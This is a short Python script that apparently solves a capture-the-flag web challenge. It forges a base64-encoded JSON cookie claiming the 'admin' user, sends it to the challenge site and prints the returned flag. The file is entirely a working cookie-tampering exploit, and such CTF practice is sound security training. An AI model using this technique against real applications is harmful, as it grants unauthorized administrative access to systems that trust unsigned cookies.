import requests
import base64
import json

url='https://useless-application.challs.olicyber.it'
payload = {"username": "admin"}

b64 = base64.b64encode(json.dumps(payload).encode()).decode()

r=requests.get(url, cookies={'user':b64}).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)